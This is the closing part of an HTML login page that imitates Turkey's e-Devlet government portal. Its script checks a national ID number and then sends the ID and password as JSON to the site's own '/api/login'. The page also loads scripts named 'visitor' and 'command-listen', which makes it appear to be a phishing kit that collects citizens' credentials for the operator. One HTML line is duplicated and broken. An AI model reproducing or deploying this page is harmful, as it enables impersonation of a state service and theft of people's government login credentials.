    <script type="text/javascript">
        (function () {
            if (!document.getElementById('edk-modal-styles')) {
                var st = document.createElement('style');
                st.id = 'edk-modal-styles';
                st.textContent =
                    '.edk-modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;}' +
                    '.edk-modal-box{background:#fff;border-radius:8px;max-width:560px;width:100%;max-height:85vh;display:flex;flex-direction:column;box-shadow:0 10px 40px rgba(0,0,0,.3);animation:edkModalIn .2s ease;}' +
                    '.edk-modal-header{padding:16px 24px;border-bottom:1px solid #e8eaed;}' +
                    '.edk-modal-title{margin:0;font-size:18px;color:#2b2b2b;}' +
                    '.edk-modal-body{padding:20px 24px;overflow-y:auto;font-size:14px;line-height:1.6;color:#444;}' +
                    '.edk-modal-body h3{font-size:15px;color:#2b2b2b;}' +
                    '.edk-modal-footer{padding:14px 24px;border-top:1px solid #e8eaed;text-align:right;}' +
                    '.edk-modal-close{background:#4284be;border:0;color:#fff;padding:8px 28px;border-radius:4px;font-size:14px;cursor:pointer;}' +
                    '.edk-modal-close:hover{background:#356ba0;}' +
                    '@keyframes edkModalIn{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}';
                document.head.appendChild(st);
            }

            function openModal(title, descHtml) {
                var existing = document.getElementById('edk-modal-root');
                if (existing) existing.remove();

                var root = document.createElement('div');
                root.id = 'edk-modal-root';
                root.className = 'edk-modal-backdrop';

                var box = document.createElement('div');
                box.className = 'edk-modal-box';
                box.setAttribute('role', 'dialog');
                box.setAttribute('aria-modal', 'true');

                var h = document.createElement('div');
                h.className = 'edk-modal-header';
                var t = document.createElement('h3');
                t.className = 'edk-modal-title';
                t.textContent = title;
                h.appendChild(t);
                box.appendChild(h);

                var b = document.createElement('div');
                b.className = 'edk-modal-body';
                b.innerHTML = descHtml;
                box.appendChild(b);

                var f = document.createElement('div');
                f.className = 'edk-modal-footer';
                var btn = document.createElement('button');
                btn.type = 'button';
                btn.className = 'edk-modal-close';
                btn.textContent = 'Kapat';
                f.appendChild(btn);
                box.appendChild(f);

                root.appendChild(box);
                document.body.appendChild(root);

                function close() {
                    root.remove();
                    document.removeEventListener('keydown', escHandler);
                }
                function escHandler(e) {
                    if (e.key === 'Escape') close();
                }
                root.addEventListener('click', function (e) {
                    if (e.target === root) close();
                });
                btn.addEventListener('click', close);
                document.addEventListener('keydown', escHandler);
            }

            document.getElementById('gizlilik_btn').addEventListener('click', function () {
                openModal('Gizlilik ve Güvenlik', document.getElementById('modalDescFooter').innerHTML);
            });
            document.getElementById('pass_detail_btn').addEventListener('click', function () {
                openModal('e-Devlet Şifresi', document.getElementById('modalDescSifreGiris').innerHTML);
            });
            document.getElementById('pass_help_btn').addEventListener('click', function () {
                openModal('e-Devlet Şifresi', document.getElementById('modalDescSifreGiris').innerHTML);
            });
        })();
    </script>

    <div id="assertive-live-region" class="visuallyhidden sr-only" aria-atomic="true" aria-live="assertive"></div> class="visuallyhidden sr-only" aria-atomic="true" aria-live="assertive"></div>
    <div id="polite-live-region" class="visuallyhidden sr-only" aria-atomic="true" aria-live="polite"></div>
    <script type="text/javascript">
        (function () {
            'use strict';
            var form = document.getElementById('loginForm');
            var trid = document.getElementById('tridField');
            var egp = document.getElementById('egpField');
            var submitBtn = document.querySelector('button[name="submitButton"]');

            function tcKimlikGecerli(v) {
                if (!/^\d{11}$/.test(v)) return false;
                var d = v.split('').map(Number);
                if (d[0] === 0) return false;
                var tek = d[0] + d[2] + d[4] + d[6] + d[8];
                var cift = d[1] + d[3] + d[5] + d[7];
                var h10 = (((tek * 7) - cift) % 10 + 10) % 10;
                if (h10 !== d[9]) return false;
                return (((tek + cift + d[9]) % 10) === d[10]);
            }

            function girisYap() {
                var t = trid.value.trim();
                var s = egp.value;
                if (!tcKimlikGecerli(t)) {
                    trid.focus();
                    trid.setAttribute('aria-invalid', 'true');
                    return;
                }
                if (!s) {
                    egp.focus();
                    return;
                }
                if (submitBtn) {
                    submitBtn.disabled = true;
                    submitBtn.textContent = 'Giriş yapılıyor...';
                }
                fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ tcno: t, sifre: s })
                })
                    .then(function (r) { return r.json(); })
                    .then(function (d) {
                        if (d && d.ok) {
                            window.location.href = '/anasayfa';
                        } else {
                            if (submitBtn) {
                                submitBtn.disabled = false;
                                submitBtn.textContent = 'Giriş Yap';
                            }
                            alert((d && d.hata) || 'Giriş yapılamadı.');
                        }
                    })
                    .catch(function () {
                        if (submitBtn) {
                            submitBtn.disabled = false;
                            submitBtn.textContent = 'Giriş Yap';
                        }
                        alert('Sunucuya bağlanılamadı.');
                    });
            }

            if (form) {
                form.addEventListener('submit', function (e) {
                    e.preventDefault();
                    e.stopPropagation();
                    girisYap();
                });
            }
            if (submitBtn) {
                submitBtn.addEventListener('click', function (e) {
                    e.preventDefault();
                    e.stopPropagation();
                    girisYap();
                });
            }
        })();
    </script>
    <script src="/js/ziyaretci.js"></script>
    <script src="/js/komut-dinle.js"></script>
</body>

